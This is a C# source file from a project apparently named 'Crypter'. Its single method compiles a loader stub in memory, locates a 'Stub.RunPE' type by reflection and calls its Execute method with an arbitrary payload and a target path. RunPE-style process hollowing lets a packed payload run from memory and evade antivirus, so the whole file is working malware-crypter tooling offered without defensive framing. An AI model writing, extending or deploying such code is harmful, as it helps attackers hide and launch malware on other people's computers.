using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;

namespace Crypter
{
    class Compiler
    {
        public static void CompileLoader(string resources, byte[] payload, string path = null)
        {
            CompilerParameters comp = new CompilerParameters();
            Dictionary<string, string> ProviderOptions = new Dictionary<string, string>();

            ProviderOptions.Add("CompilerVersion", "v3.5");
            comp.GenerateExecutable = false;
            comp.GenerateInMemory = true;

            comp.TreatWarningsAsErrors = false;

            comp.ReferencedAssemblies.Add("System.dll");
            comp.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            comp.ReferencedAssemblies.Add("System.Drawing.dll");
            comp.ReferencedAssemblies.Add("System.Data.dll");
            comp.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");





            CompilerResults Results = new CSharpCodeProvider(ProviderOptions).CompileAssemblyFromSource(comp, resources);

            //Execute Loader

            Module loader = Results.CompiledAssembly.GetModules()[0];
            Type tp = null;
            MethodInfo methodInfo = null;

            if (loader != null)
            {
                tp = loader.GetType("Stub.RunPE");
            }
            if (tp != null)
            {
                methodInfo = tp.GetMethod("Execute");
            }
            if (methodInfo != null)
            {
                methodInfo.Invoke(null, new object[] { payload, path });
            }

        }
    }
}